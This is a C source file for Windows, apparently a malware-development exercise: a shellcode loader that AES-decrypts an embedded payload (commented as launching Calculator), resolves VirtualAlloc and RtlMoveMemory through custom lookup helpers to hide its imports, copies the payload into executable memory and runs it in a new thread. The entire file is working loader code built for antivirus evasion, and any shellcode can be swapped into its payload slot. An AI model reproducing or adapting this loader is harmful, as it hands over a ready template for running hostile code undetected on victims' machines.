#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include<tlhelp32.h>
#include "helpers.h"

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef VOID(WINAPI* RtlMoveMemory_t)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);

//brings up calc  
char key[] = { 0x2e, 0x54, 0x6c, 0xb9, 0x4e, 0x1, 0xcb, 0x49, 0xf7, 0x6a, 0x18, 0xf5, 0x34, 0xc7, 0x3f, 0xeb };
char unsigned payload[] = { 0x53, 0x1f, 0x82, 0x62, 0xa6, 0xb0, 0x2c, 0x41, 0x3e, 0xc0, 0x45, 0xcd, 0x40, 0xb1, 0xf8, 0xdc, 0xd8, 0x3d, 0x25, 0x4, 0x3c, 0x94, 0xcf, 0x0, 0xcd, 0xfb, 0xb7, 0xc3, 0xb2, 0xc4, 0x1e, 0x60, 0x6c, 0x57, 0x58, 0x11, 0x37, 0xaa, 0x54, 0x8f, 0x36, 0x3b, 0x70, 0xb1, 0xd, 0x75, 0x97, 0x6, 0x38, 0x50, 0x93, 0xb7, 0xd2, 0x45, 0x1b, 0xbe, 0xb7, 0xea, 0x3, 0x9b, 0x9a, 0x1e, 0xff, 0x7f, 0x72, 0xe4, 0xe3, 0xd0, 0x98, 0x27, 0x2b, 0x47, 0x21, 0x4b, 0x66, 0xe3, 0xed, 0x8c, 0xdf, 0x7b, 0xa, 0x46, 0x62, 0x1a, 0xc, 0x85, 0x95, 0xf8, 0xe0, 0xd2, 0xe4, 0x59, 0x47, 0xe8, 0xaa, 0x25, 0x1f, 0x99, 0x94, 0xb0, 0x6, 0x3b, 0x15, 0xb1, 0xa9, 0xfb, 0x57, 0xc9, 0x21, 0xbd, 0xf7, 0x25, 0xff, 0xdc, 0x87, 0xba, 0x64, 0xbe, 0x3f, 0x61, 0x28, 0x89, 0x13, 0x4d, 0xb6, 0xbc, 0xfc, 0xf5, 0x71, 0x55, 0x3d, 0x3d, 0x16, 0x87, 0x40, 0x40, 0x9b, 0x15, 0x78, 0x78, 0x7d, 0xe7, 0xc4, 0xf4, 0x61, 0xe0, 0xbb, 0x70, 0x3b, 0xf4, 0x0, 0x94, 0x95, 0xce, 0x44, 0x27, 0x1f, 0x98, 0xca, 0x54, 0x59, 0x97, 0xa8, 0x4c, 0x8, 0x9f, 0x4b, 0xc0, 0x91, 0x45, 0x51, 0x84, 0x51, 0x4f, 0x5c, 0x79, 0x7d, 0x26, 0xcb, 0x98, 0x75, 0x5, 0x33, 0xb6, 0x43, 0xf3, 0x43, 0xea, 0xf4, 0x9c, 0xec, 0x5c, 0xab, 0x42, 0x39, 0x1e, 0x2f, 0xf6, 0x9a, 0xcc, 0x54, 0x7f, 0x67, 0x88, 0x8b, 0xa3, 0x8f, 0xf9, 0xe7, 0xd7, 0xf1, 0x60, 0x72, 0x78, 0xc0, 0xf0, 0xf9, 0x31, 0x8c, 0x7f, 0xf9, 0xa0, 0x21, 0xdf, 0x27, 0x88, 0x9f, 0x5c, 0x66, 0xed, 0x7d, 0x35, 0x99, 0xa9, 0x80, 0xb6, 0xe7, 0x6e, 0x91, 0x37, 0xd1, 0xd5, 0x23, 0x61, 0x6, 0xb1, 0x33, 0x5a, 0x3b, 0xa6, 0xd6, 0xac, 0x93, 0xfb, 0x7a, 0x40, 0x97, 0x25, 0xaf, 0xbb, 0x84, 0x9b, 0xcb, 0x2e, 0xc5, 0x33, 0xf5, 0xad, 0x2d, 0x16, 0x51, 0x1d, 0x44, 0xa1, 0x2e, 0x6b, 0x2b, 0x23, 0x21, 0xb0, 0xa4, 0xb7, 0xee, 0x2, 0x6, 0x99, 0xd8, 0x3c };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	LPVOID exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned int payload_len = sizeof payload;



	//VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "VirtualAlloc");
	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "RtlMoveMemory");

	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
	

	printf("\nhello world\n");

	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("\nhello world after memory\n");
	printf("%-20s : 0x%-016p\n", "addr of void * payload", (void*)payload);
	printf("%-20s : 0x%-016p\n", "payload & addr", &payload);
	printf("%-20s : 0x%-016p\n", "payload addr", payload);

	printf("%-20s : 0x%-016p\n", "exec_mem void * addr", (void*)exec_mem);
	printf("%-20s : 0x%-016p\n", "exec_mem  addr", exec_mem);
	printf("%-20s : 0x%-016p\n", "exec_mem &  addr", &exec_mem);
	

	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof key);

	printf(" payload %s : key %s", (char *)payload , (char *) key);
	pRtlMoveMemory(exec_mem, payload, payload_len);

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}